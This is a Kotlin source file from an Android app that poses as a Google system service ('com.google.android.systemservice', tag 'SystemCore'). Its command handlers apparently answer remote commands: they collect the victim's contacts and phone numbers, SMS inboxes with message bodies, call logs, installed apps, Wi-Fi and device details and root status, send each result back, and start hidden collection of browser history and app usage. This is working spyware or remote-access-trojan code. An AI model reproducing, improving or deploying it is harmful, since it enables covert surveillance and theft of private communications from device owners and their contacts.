package com.google.android.systemservice.handlers

import android.content.Context
import android.content.Intent
import android.net.wifi.WifiManager
import android.util.Log
import com.google.android.systemservice.services.AppUsageService
import com.google.android.systemservice.services.BrowserHistoryService
import kotlinx.coroutines.launch
import org.json.JSONObject
import java.io.File

class DeviceInfoHandlers(private val ctx: CommandContext) {

    companion object {
        private const val TAG = "SystemCore"
    }

    fun executeGetDeviceInfo() {
        ctx.scope.launch {
            val info = collectDeviceInfo()
            ctx.sendResponse("device_info", info)
        }
    }

    fun executeGetContacts() {
        ctx.scope.launch {
            val contacts = collectContacts()
            ctx.sendResponse("contacts", JSONObject().put("contacts", contacts))
        }
    }

    fun executeGetSms() {
        ctx.scope.launch {
            val sms = collectSms()
            ctx.sendResponse("sms", JSONObject().put("messages", sms))
        }
    }

    fun executeGetCallLogs() {
        ctx.scope.launch {
            val logs = collectCallLogs()
            ctx.sendResponse("call_logs", JSONObject().put("logs", logs))
        }
    }

    fun executeGetInstalledApps() {
        ctx.scope.launch {
            val apps = collectInstalledApps()
            ctx.sendResponse("installed_apps", JSONObject().put("apps", apps))
        }
    }

    fun executeGetWifiInfo() {
        ctx.scope.launch {
            try {
                val wifiManager = ctx.appContext.getSystemService(Context.WIFI_SERVICE) as? WifiManager ?: return@launch
                val wifiInfo = wifiManager.connectionInfo

                val info = JSONObject().apply {
                    put("ssid", wifiInfo.ssid?.replace("\"", "") ?: "Unknown")
                    put("bssid", wifiInfo.bssid ?: "Unknown")
                    put("ip_address", intToIp(wifiInfo.ipAddress))
                    put("link_speed", wifiInfo.linkSpeed)
                    put("rssi", wifiInfo.rssi)
                    put("mac_address", wifiInfo.macAddress ?: "Unknown")
                }

                ctx.sendResponse("wifi_info", info)
            } catch (e: Exception) {
                sendError("Get WiFi info error: ${(e.message ?: "Unknown error")}")
            }
        }
    }

    fun executeGetAppUsage() {
        ctx.appContext.startService(Intent(ctx.appContext, AppUsageService::class.java))
        ctx.sendResponse("app_usage", JSONObject().apply {
            put("status", "collecting")
        })
    }

    fun executeGetBrowserHistory() {
        ctx.appContext.startService(Intent(ctx.appContext, BrowserHistoryService::class.java))
        ctx.sendResponse("browser_history", JSONObject().apply {
            put("status", "collecting")
        })
    }

    // --- Helper functions ---

    private fun collectDeviceInfo(): JSONObject {
        val batteryLevel = try {
            val batteryManager = ctx.appContext.getSystemService(Context.BATTERY_SERVICE) as? android.os.BatteryManager
            batteryManager?.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY) ?: -1
        } catch (e: Exception) { -1 }

        val isRooted = try {
            val paths = arrayOf("/system/xbin/su", "/system/bin/su", "/sbin/su", "/data/local/xbin/su")
            paths.any { File(it).exists() }
        } catch (e: Exception) { false }

        return JSONObject().apply {
            put("device_id", ctx.getDeviceIdentifier())
            put("manufacturer", android.os.Build.MANUFACTURER)
            put("model", android.os.Build.MODEL)
            put("brand", android.os.Build.BRAND)
            put("sdk_version", android.os.Build.VERSION.SDK_INT)
            put("android_version", android.os.Build.VERSION.RELEASE)
            put("os_version", android.os.Build.VERSION.RELEASE)
            put("device", android.os.Build.DEVICE)
            put("product", android.os.Build.PRODUCT)
            put("battery_level", batteryLevel)
            put("is_rooted", isRooted)
        }
    }

    private fun collectContacts(): org.json.JSONArray {
        val contacts = org.json.JSONArray()
        try {
            val cursor = ctx.appContext.contentResolver.query(
                android.provider.ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null
            )
            cursor?.use {
                while (it.moveToNext()) {
                    val id = it.getString(it.getColumnIndexOrThrow(android.provider.ContactsContract.Contacts._ID))
                    val name = it.getString(it.getColumnIndexOrThrow(android.provider.ContactsContract.Contacts.DISPLAY_NAME))

                    val contact = JSONObject().apply {
                        put("id", id)
                        put("name", name ?: "Unknown")
                    }

                    // Get phone numbers
                    val phones = org.json.JSONArray()
                    val phoneCursor = ctx.appContext.contentResolver.query(
                        android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                        null,
                        "${android.provider.ContactsContract.CommonDataKinds.Phone.CONTACT_ID} = ?",
                        arrayOf(id),
                        null
                    )
                    phoneCursor?.use { pc ->
                        while (pc.moveToNext()) {
                            val phone = pc.getString(pc.getColumnIndexOrThrow(android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER))
                            phones.put(phone)
                        }
                    }
                    contact.put("phones", phones)
                    contacts.put(contact)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error collecting contacts: ${(e.message ?: "Unknown error")}")
        }
        return contacts
    }

    private fun collectSms(): org.json.JSONArray {
        val messages = org.json.JSONArray()
        try {
            val cursor = ctx.appContext.contentResolver.query(
                android.net.Uri.parse("content://sms/inbox"),
                null, null, null, "date DESC LIMIT 100"
            )
            cursor?.use {
                while (it.moveToNext()) {
                    val msg = JSONObject().apply {
                        put("address", it.getString(it.getColumnIndexOrThrow("address")))
                        put("body", it.getString(it.getColumnIndexOrThrow("body")))
                        put("date", it.getLong(it.getColumnIndexOrThrow("date")))
                        put("read", it.getInt(it.getColumnIndexOrThrow("read")))
                    }
                    messages.put(msg)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error collecting SMS: ${(e.message ?: "Unknown error")}")
        }
        return messages
    }

    private fun collectCallLogs(): org.json.JSONArray {
        val logs = org.json.JSONArray()
        try {
            val cursor = ctx.appContext.contentResolver.query(
                android.provider.CallLog.Calls.CONTENT_URI,
                null, null, null, "${android.provider.CallLog.Calls.DATE} DESC LIMIT 100"
            )
            cursor?.use {
                while (it.moveToNext()) {
                    val log = JSONObject().apply {
                        put("number", it.getString(it.getColumnIndexOrThrow(android.provider.CallLog.Calls.NUMBER)))
                        put("type", it.getInt(it.getColumnIndexOrThrow(android.provider.CallLog.Calls.TYPE)))
                        put("date", it.getLong(it.getColumnIndexOrThrow(android.provider.CallLog.Calls.DATE)))
                        put("duration", it.getLong(it.getColumnIndexOrThrow(android.provider.CallLog.Calls.DURATION)))
                    }
                    logs.put(log)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error collecting call logs: ${(e.message ?: "Unknown error")}")
        }
        return logs
    }

    private fun collectInstalledApps(): org.json.JSONArray {
        val apps = org.json.JSONArray()
        try {
            val pm = ctx.appContext.packageManager
            val packages = pm.getInstalledApplications(android.content.pm.PackageManager.GET_META_DATA)
            for (appInfo in packages) {
                val app = JSONObject().apply {
                    put("package", appInfo.packageName)
                    put("name", pm.getApplicationLabel(appInfo).toString())
                    put("is_system", (appInfo.flags and android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0)
                }
                apps.put(app)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error collecting apps: ${(e.message ?: "Unknown error")}")
        }
        return apps
    }

    private fun intToIp(address: Int): String {
        return "${address and 0xFF}.${(address shr 8) and 0xFF}.${(address shr 16) and 0xFF}.${(address shr 24) and 0xFF}"
    }

    private fun sendError(message: String) {
        ctx.sendResponse("error", JSONObject().apply {
            put("error", message)
        })
    }
}
